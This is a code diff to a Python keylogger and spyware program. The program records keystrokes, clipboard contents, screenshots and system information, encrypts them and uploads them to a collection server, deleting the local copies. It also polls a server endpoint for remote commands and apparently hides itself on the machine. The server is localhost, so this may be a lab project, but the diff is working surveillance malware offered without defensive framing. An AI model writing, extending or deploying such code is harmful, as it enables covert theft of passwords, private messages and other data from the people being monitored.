@@ -273,23 +273,45 @@ def move_to_hidden_location():
 
 def send_to_server(file_path, server_url, file_type, retain_file):
     try:
+        # Check if the file exists and not empty
         if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
             with open(file_path, 'rb') as f:
                 response = requests.post(server_url, files={'file': f},
                                          data={'machine_id': machine_id, 'file_type': file_type})
             if not retain_file:
-                os.remove(file_path)  # Delete the file from the local machine after sending
+                os.remove(file_path)  # Safely delete after upload
             return response.text
         else:
             print(f"File {file_path} does not exist or is empty, not sending to server.")
     except Exception as e:
-        print(f"Error sending {file_path} to server: {e}")
+        print(f"Error uploading {file_path}: {e}")
+
+
+# Encrypt and send keylogger data
+try:
+    keys_file = os.path.join(log_dir, f"key_log_{machine_id}.txt")
+    if os.path.exists(keys_file) and os.path.getsize(keys_file) > 0:
+        with open(keys_file, 'rb') as f:
+            data = f.read()
+        encrypted = fernet.encrypt(data)
+        keys_file_encrypted = keys_file.replace("key_log", "e_key_log")
+        with open(keys_file_encrypted, 'wb') as ef:
+            ef.write(encrypted)
+        response = send_to_server(
+            keys_file_encrypted,
+            "http://127.0.0.1:5001/upload",
+            file_type='keylog',
+            retain_file=False
+        )
+        print(f"Keylogger data sent: {response}")
+except Exception as e:
+    print(f"Error handling keylogger data: {e}")
 
 
 def check_server_for_command():
     global is_logging, keylogger_active
     try:
-        response = requests.get(f"http://127.0.0.1:5000/command/{machine_id}")
+        response = requests.get(f"http://127.0.0.1:5001/command/{machine_id}")
         command = response.json().get('current_command')
         if command == "STOP":
             is_logging = False
@@ -380,6 +402,7 @@ def keypressed(key):
         print(f"Error logging key presses: {e}")
 
 
+
 listener = keyboard.Listener(on_press=keypressed)
 listener.start()
 
@@ -393,6 +416,7 @@ while number_of_iterations < number_of_iterations_end:
 
         iteration_tag = f"iteration_{number_of_iterations}"
         system_data_file = os.path.join(log_dir, f"systeminfo_{machine_id}.txt")
+        keys_file = os.path.join(log_dir, f"key_log_{machine_id}.txt")
         clipboard_file = os.path.join(log_dir, f"clipboard_{machine_id}.txt")
         screenshot_dir = os.path.join(log_dir, f"screenshots_{machine_id}")
         os.makedirs(screenshot_dir, exist_ok=True)
@@ -402,61 +426,90 @@ while number_of_iterations < number_of_iterations_end:
         keys_file_encrypted = os.path.join(log_dir, f"e_key_log_{machine_id}.txt")
         system_file_encrypted = os.path.join(log_dir, f"e_systeminfo_{machine_id}.txt")
 
+        # Controlled timed operation
         if time.time() > stopping_time:
             print(f"Iteration: {number_of_iterations}")
 
             if number_of_iterations == 0:
                 computer_information(system_data_file)
 
-            # Send and encrypt system information
+            # Encrypt and send system information
             if os.path.exists(system_data_file) and os.path.getsize(system_data_file) > 0:
-                with open(system_data_file, 'rb') as f:
-                    data = f.read()
-                encrypted = fernet.encrypt(data)
-                with open(system_file_encrypted, 'wb') as ef:
-                    ef.write(encrypted)
-                send_to_server(system_file_encrypted, "http://127.0.0.1:5000/upload", file_type='system',
-                               retain_file=False)
-
-            # Take screenshot
-            take_screenshot(screenshot_file)
-            send_to_server(screenshot_file, "http://127.0.0.1:5000/upload", file_type='screenshot', retain_file=False)
-
-            # Copy clipboard
-            copy_clipboard(clipboard_file)
-
-            # Encrypt and send clipboard and keylog files
-            files_to_encrypt = [clipboard_file, os.path.join(log_dir, f"key_log_{machine_id}.txt")]
-            encrypted_file_names = [clipboard_file_encrypted, keys_file_encrypted]
-
-            for i, file in enumerate(files_to_encrypt):
                 try:
-                    # Check if file exists and has content
-                    if os.path.exists(file) and os.path.getsize(file) > 0:
-                        with open(file, 'rb') as f:
-                            data = f.read()
-                        encrypted = fernet.encrypt(data)
-                        with open(encrypted_file_names[i], 'wb') as ef:
-                            ef.write(encrypted)
-                        send_to_server(encrypted_file_names[i], "http://127.0.0.1:5000/upload",
-                                       file_type='keylog' if 'key_log' in file else 'clipboard', retain_file=False)
-
-                        # For debugging: Print encrypted content
-                        print(f"Encrypted {file}: {encrypted[:100]}...")
-
-                    else:
-                        print(f"File not found or empty: {file}")
-
-                    # Delete original file after encryption and sending
-                    os.remove(file)
-
+                    with open(system_data_file, 'rb') as f:
+                        data = f.read()
+                    encrypted = fernet.encrypt(data)
+                    with open(system_file_encrypted, 'wb') as ef:
+                        ef.write(encrypted)
+                    response = send_to_server(
+                        system_file_encrypted,
+                        "http://127.0.0.1:5001/upload",
+                        file_type='system',
+                        retain_file=False
+                    )
+                    print(f"System info sent. Server response: {response}")
                 except Exception as e:
-                    print(f"Error encrypting and sending file {file}: {e}")
+                    print(f"Error encrypting or sending system information: {e}")
 
+            # Take and send a screenshot
+            try:
+                take_screenshot(screenshot_file)
+                response = send_to_server(
+                    screenshot_file,
+                    "http://127.0.0.1:5001/upload",
+                    file_type='screenshot',
+                    retain_file=False
+                )
+                print(f"Screenshot sent. Server response: {response}")
+            except Exception as e:
+                print(f"Error taking or sending screenshot: {e}")
+
+            # Copy and send clipboard data
+            try:
+                copy_clipboard(clipboard_file)
+                if os.path.exists(clipboard_file) and os.path.getsize(clipboard_file) > 0:
+                    with open(clipboard_file, 'rb') as f:
+                        data = f.read()
+                    encrypted = fernet.encrypt(data)
+                    with open(clipboard_file_encrypted, 'wb') as ef:
+                        ef.write(encrypted)
+                    response = send_to_server(
+                        clipboard_file_encrypted,
+                        "http://127.0.0.1:5001/upload",
+                        file_type='clipboard',
+                        retain_file=False
+                    )
+                    print(f"Clipboard data sent. Server response: {response}")
+            except Exception as e:
+                print(f"Error copying or sending clipboard data: {e}")
+
+            # Encrypt and send the keylogger file
+            try:
+                keys_file = os.path.join(log_dir, f"key_log_{machine_id}.txt")
+                if os.path.exists(keys_file) and os.path.getsize(keys_file) > 0:
+                    with open(keys_file, 'rb') as f:
+                        data = f.read()
+                    encrypted = fernet.encrypt(data)
+                    with open(keys_file_encrypted, 'wb') as ef:
+                        ef.write(encrypted)
+                    response = send_to_server(
+                        keys_file_encrypted,
+                        "http://127.0.0.1:5001/upload",
+                        file_type='keylog',
+                        retain_file=False
+                    )
+                    print(f"Key log info sent. Server response: {response}")
+                    os.remove(keys_file)  # Remove after sending
+            except Exception as e:
+                print(f"Error encrypting or sending key log: {e}")
+
+            # Update iteration timing and counter
             number_of_iterations += 1
             current_time = time.time()
             stopping_time = current_time + time_iteration
+
     except Exception as e:
         print(f"Error during iteration: {e}")
 
 time.sleep(120)
+
